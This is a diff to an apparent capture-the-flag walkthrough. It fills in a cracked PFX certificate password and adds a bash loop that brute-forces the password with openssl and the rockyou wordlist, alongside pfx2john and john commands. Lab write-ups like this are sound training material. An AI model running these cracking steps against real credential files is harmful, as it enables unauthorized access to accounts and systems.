@@ -100,8 +100,23 @@ pfx2john legacyy_dev_auth.pfx > pfx.hash
 john pfx.hash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-<!-- TODO: confirm the cracked PFX password from your run and paste it here -->
-PFX password: **`<TODO: fill in>`**
+```
+thuglegacy       (legacyy_dev_auth.pfx)
+```
+
+PFX password: **`thuglegacy`**
+
+> **Gotcha:** on recent Kali, `pfx2john` can crash with
+> `asn1crypto ... ValueError: Insufficient data - 1 bytes requested but only 0 available`.
+> That error is usually a **truncated/empty .pfx** (e.g. a bad extraction), not the
+> tool - re-extract from `Dev\winrm_backup.zip` and run `pfx2john` against the
+> intact copy. If it genuinely is the asn1crypto bug on a valid file, brute-force
+> the password with openssl directly instead:
+> ```bash
+> while read -r p; do openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys \
+>   -passin pass:"$p" >/dev/null 2>&1 && echo "[+] $p" && break; \
+>   done < /usr/share/wordlists/rockyou.txt
+> ```
 
 ### 4. Extract key + cert from the PFX
 
